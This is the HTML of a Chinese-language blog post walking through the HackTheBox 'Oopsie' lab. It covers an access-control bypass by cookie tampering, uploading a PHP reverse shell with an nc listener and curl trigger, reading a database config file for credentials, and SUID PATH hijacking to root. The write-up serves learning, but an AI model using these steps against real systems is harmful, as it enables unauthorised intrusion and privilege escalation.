@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>[HTB] Oopsie 渗透测试笔记 | Nuyoahのblog</title><meta name="author" content="Nuyoah,3287828082@qq.com"><meta name="copyright" content="Nuyoah"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HackTheBox:Oopsie 靶场的完整渗透流程，包括信息收集、BurpSuite 代理抓包、文件上传漏洞利用、SUID 提权等步骤。 在本次测试中，寻找web漏洞要检查cookie、session等信息，搞清楚访问控制如何工作的。"><meta property="og:type" content="article"><meta property="og:title" content="[HTB] Oopsie 渗透测试笔记"><meta property="og:url" content="https://isnuyoah.github.io/posts/1c2d3e4f.html"><meta property="og:site_name" content="Nuyoahのblog"><meta property="og:description" content="HackTheBox:Oopsie 靶场的完整渗透流程，包括信息收集、BurpSuite 代理抓包、文件上传漏洞利用、SUID 提权等步骤。 在本次测试中，寻找web漏洞要检查cookie、session等信息，搞清楚访问控制如何工作的。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://isnuyoah.github.io/img/post/1754126926_IMG_4504.webp"><meta property="article:published_time" content="2025-08-03T04:00:00.000Z"><meta property="article:modified_time" content="2025-08-03T06:54:14.580Z"><meta property="article:author" content="Nuyoah"><meta property="article:tag" content="Nuyosh,blog,meng,dream"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://isnuyoah.github.io/img/post/1754126926_IMG_4504.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[HTB] Oopsie 渗透测试笔记",
+  "url": "https://isnuyoah.github.io/posts/1c2d3e4f.html",
+  "image": "https://isnuyoah.github.io/img/post/1754126926_IMG_4504.webp",
+  "datePublished": "2025-08-03T04:00:00.000Z",
+  "dateModified": "2025-08-03T06:54:14.580Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Nuyoah",
+      "url": "https://isnuyoah.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar/20250801-1.webp"><link rel="canonical" href="https://isnuyoah.github.io/posts/1c2d3e4f.html"><link rel="preconnect"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#3b70fc"><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/font.png"><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/font.png"><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/font.png"><link rel="mask-icon" href="/img/siteicon/font.png" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css"><link rel="stylesheet" href="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/node-snackbar/0.1.16/snackbar.min.css" media="print" onload='this.media="all"'><script>(() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-center"},
+  infinitegrid: {
+    js: '/',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"[HTB] Oopsie 渗透测试笔记",isHighlightShrink:!1,isToc:!0,pageType:"post"}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload='this.media="all"'><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload='this.media="screen"'><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Nuyoahのblog" type="application/atom+xml"></head><body><div id="web_bg" style="background-image:url(/img/background/20250801-1.webp)"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar/20250801-0.jpg" onerror='this.onerror=null,this.src="/img/common/404.webp"' alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>主页</span></a></div><div class="menus_item"><span class="site-page group"><span>靶场系列</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fas fa-bullseye"></i> <span>HTB</span></a></li><li><a class="site-page child" href="/categories/tryhackme/"><i class="fa-fw fas fa-bullseye"></i> <span>TRYHACKME</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i> <span>生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fas fa-home"></i> <span>追番</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i> <span>书籍</span></a></li><li><a class="site-page child" href="/suishuo/"><i class="fa-fw fas fa-comment"></i> <span>随说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i> <span>留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/img/post/1754126926_IMG_4504.webp)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Nuyoahのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">[HTB] Oopsie 渗透测试笔记</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>主页</span></a></div><div class="menus_item"><span class="site-page group"><span>靶场系列</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fas fa-bullseye"></i> <span>HTB</span></a></li><li><a class="site-page child" href="/categories/tryhackme/"><i class="fa-fw fas fa-bullseye"></i> <span>TRYHACKME</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i> <span>生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fas fa-home"></i> <span>追番</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i> <span>书籍</span></a></li><li><a class="site-page child" href="/suishuo/"><i class="fa-fw fas fa-comment"></i> <span>随说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i> <span>留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[HTB] Oopsie 渗透测试笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-03T04:00:00.000Z" title="发表于 2025-08-03 12:00:00">2025-08-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-03T06:54:14.580Z" title="更新于 2025-08-03 14:54:14">2025-08-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HackTheBox-Oopsie-靶场的完整渗透流程"><a href="#HackTheBox-Oopsie-靶场的完整渗透流程" class="headerlink" title="HackTheBox:Oopsie 靶场的完整渗透流程"></a>HackTheBox:Oopsie 靶场的完整渗透流程</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754180918-03.webp" alt="Oopsie 靶场"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754180955-04.webp" alt="Oopsie 靶场信息"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>使用 Nmap 进行端口扫描，发现以下开放端口：<br>22/tcp open ssh<br>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754181306-05.webp" alt="Oopsie 靶场端口扫描结果"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -sV -Pn 10.129.95.191</span><br></pre></td></tr></table></figure><h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><h3 id="1-根据端口扫描结果，访问-HTTP-服务"><a href="#1-根据端口扫描结果，访问-HTTP-服务" class="headerlink" title="1.根据端口扫描结果，访问 HTTP 服务"></a>1.根据端口扫描结果，访问 HTTP 服务</h3><p>根据提示发现需要找login页面，f12查看源代码发现路径<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754181826-06.webp" alt="Oopsie 靶场登录页面路径"></p><p>成功访问页面<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754181894-07.webp" alt="Oopsie 靶场登录页面"></p><p>尝试了弱口令爆破没有成功，使用以游客身份登陆进一步获取信息</p><h2 id="三、获取用户权限"><a href="#三、获取用户权限" class="headerlink" title="三、获取用户权限"></a>三、获取用户权限</h2><h3 id="1-使用-BurpSuite-代理抓包，获得管理员id和username"><a href="#1-使用-BurpSuite-代理抓包，获得管理员id和username" class="headerlink" title="1.使用 BurpSuite 代理抓包，获得管理员id和username"></a>1.使用 BurpSuite 代理抓包，获得管理员id和username</h3><p>以游客身份登陆进去后，在Account模块发现id传包，于是使用 BurpSuite 代理抓包，并遍历id<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754183442-10.webp" alt="Oopsie 靶场抓包遍历结果">、<br>发现了admin和super admin<br>之后使用super admin放包<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754183739-13.webp" alt="Oopsie 靶场放包"><br>successfully!</p><p>之后根据靶场要求使用upload功能上传文件。<br>发现以游客身份无法上传<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754182243-08.webp" alt="Oopsie 靶场上传文件"></p><p>于是根据之前的抓包过程，先进行uploads页面抓包，修改为super admin的id和username然后放包，成功访问该模块<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754183788-14.webp" alt="Oopsie 靶场上传页面"></p><h3 id="2-上传反弹shell文件"><a href="#2-上传反弹shell文件" class="headerlink" title="2.上传反弹shell文件"></a>2.上传反弹shell文件</h3><p>首先找upload上传路径，使用gobuster进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.129.95.191 -w /usr/share/wordlists/dirb/common.txt -t 50</span><br></pre></td></tr></table></figure><p>发现是uploads文件夹</p><p>准备php反弹shell文件。<br>这里我使用kali自带的php-reverse-shell.php文件<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1.webp" alt="Oopsie 靶场上传反弹shell文件"></p><p>接下来修改监听ip和端口<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754184067-15.webp" alt="Oopsie 靶场修改监听IP和端口"></p><details><summary>⚠ `错误提示，点击查看`</summary>注意`**上图修改的端口最好使用8888**，因为我这里使用4444端口失败了，chatgpt给的是可能被靶机防火墙规则封掉了`</details><details><summary>📌 Vim 简单使用速查表（点击展开）</summary>## 1. 进入和退出 Vim<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim filename        <span class="comment"># 打开或新建文件</span></span><br><span class="line">i                   <span class="comment"># 进入插入模式</span></span><br><span class="line">Esc                 <span class="comment"># 退出插入模式</span></span><br></pre></td></tr></table></figure>## 2. 保存和退出<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:q                   <span class="comment"># 退出 Vim</span></span><br><span class="line">:q!                <span class="comment"># 强制退出 Vim</span></span><br><span class="line">:w                   <span class="comment"># 保存文件</span></span><br><span class="line">:wq                  <span class="comment"># 保存并退出 Vim</span></span><br></pre></td></tr></table></figure>## 3. 编辑文本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x                   <span class="comment"># 删除光标所在字符</span></span><br><span class="line"><span class="built_in">dd</span>                  <span class="comment"># 删除当前行  </span></span><br><span class="line">yy                  <span class="comment"># 复制当前行</span></span><br><span class="line">p                   <span class="comment"># 粘贴复制的行</span></span><br><span class="line">u                   <span class="comment"># 撤销上一步操作</span></span><br><span class="line">Ctrl + r            <span class="comment"># 重做上一步操作</span></span><br></pre></td></tr></table></figure></details><p>修改成自己的监听IP和端口后，使用nc监听<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><br><strong>在上传过程中依然要抓包修改cookie</strong><br>提示上传成功<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754184176-16.webp" alt="Oopsie 靶场上传成功"><p></p><h3 id="3-使用curl触发反弹shell"><a href="#3-使用curl触发反弹shell" class="headerlink" title="3. 使用curl触发反弹shell"></a>3. 使用curl触发反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.129.95.191/uploads/phpshell.php</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754185748-18.webp" alt="Oopsie 靶场触发反弹shell"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754186609-19.webp" alt="whoami"><br>成功获取shell</p><h2 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h2><h3 id="1-提升为terminal-shell"><a href="#1-提升为terminal-shell" class="headerlink" title="1. 提升为terminal shell"></a>1. 提升为terminal shell</h3><p>之前获得到的是一个php shell，并不能算是终端，需要做一下升级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用升级方法</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line">Ctrl + Z                <span class="comment"># 挂起当前会话</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span>      <span class="comment"># 恢复会话</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>使用linux命令查看cdn-cgi/login目录内部文件<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /var/www/html/cdn-cgi/login</span><br></pre></td></tr></table></figure><p></p><p>发现db.php文件<br>怀疑内部有数据库连接信息<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/cdn-cgi/login/db.php</span><br></pre></td></tr></table></figure><p></p><p>提权以robert用户身份登录<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su robert</span><br></pre></td></tr></table></figure><p></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/2.webp" alt="Oopsie 靶场robert提权成功"></p><p>查看目录<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la</span><br></pre></td></tr></table></figure><p></p><p>查找当前用户id,组id以及所属的group<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/3.webp" alt="Oopsie 靶场robert用户信息"><p></p><p>查找属于该group的全部文件<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group bugtracker 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/3.webp" alt="Oopsie 靶场查找bugtracker组文件"><p></p><p>发现只有一个/usr/bin/bugtracker文件</p><p>查看该文件权限和详细信息<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /usr/bin/bugtracker</span><br></pre></td></tr></table></figure><p></p><p>发现该文件是一个涉及到SUID方面的文件</p><details><summary>🔍 关于 `SUID`</summary>SUID（Set User ID）是一个特殊的文件权限位，当一个可执行文件被设置了 SUID 位时，任何用户运行该文件时，都会以文件所有者的权限来执行，而不是以运行该文件的用户的权限来执行。这通常用于允许普通用户执行需要更高权限的程序。</details><p>执行该文件<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker</span><br></pre></td></tr></table></figure><p></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/4.webp" alt="Oopsie 靶场执行bugtracker文件"></p><p>这里直接输入root.txt文件路径发现能直接获取root的flag<br>但是依然没有获取到root权限，所以我尝试利用该文件获取.ssh/id_rsa文件<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker </span><br><span class="line">/root/.ssh/id_rsa</span><br></pre></td></tr></table></figure><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/5.webp" alt="Oopsie 靶场获取id_rsa文件"><br>但是如上图失败了，个人推测可能是该文件不存在（大概率），或者权限不足<p></p><h3 id="3-使用PATH劫持提权"><a href="#3-使用PATH劫持提权" class="headerlink" title="3. 使用PATH劫持提权"></a>3. 使用PATH劫持提权</h3><details><summary>PATH劫持的原理</summary>利用了 /usr/bin/bugtracker 这个程序是 setuid root 并且在代码里直接调用了 cat，但没有用绝对路径。</details><p>在/tmp创建假的cat程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt; /tmp/cat</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/cat</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span> <span class="comment">#将/tmp放在PATH最前面</span></span><br></pre></td></tr></table></figure><p>执行bugtracker程序</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/htb/oopsie/1754188737-21.webp" alt="Oopsie 利用PATH劫持提权"></p><p>成功获取最高root权限！<br>参考: <a target="_blank" rel="noopener" href="https://xsh.asia/2024/12/19/Hack-The-Box-Oopsie/">Hack-The-Box Oopsie</a> 的分析</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>在本次测试中，在执行反弹shell时候，有时候文件上传成功一次，但有时候需要多次尝试才能成功。这可能与靶场的防护机制有关，需要根据实际情况灵活应对。<br>上传的 php-reverse-shell.php 会在被访问（curl）时，立刻执行 system() 反弹到监听端口，然后 PHP 脚本结束，进程销毁。当第二次 curl 时，如果服务器的 PHP 环境不允许重复执行某些脚本（比如缓存、会话锁），可能就不触发。</p><p>这也是我第一次遇到通过PATH劫持提权的情况，非常有助于拓展提权思路</p><p>每一次突破权限，都是跨越认知的藩篱；每一次失败，都是积蓄下一次成功的力量！</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者:</span> <span class="post-copyright-info"><a href="https://isnuyoah.github.io/">Nuyoah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接:</span> <span class="post-copyright-info"><a href="https://isnuyoah.github.io/posts/1c2d3e4f.html">https://isnuyoah.github.io/posts/1c2d3e4f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://isnuyoah.github.io" target="_blank">Nuyoahのblog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/post/1754126926_IMG_4504.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/" media="print" onload='this.media="all"'><script src="/" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>恰点米</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.webp" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wechat.webp" alt="微信"></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zfb.webp" target="_blank"><img class="post-qr-code-img" 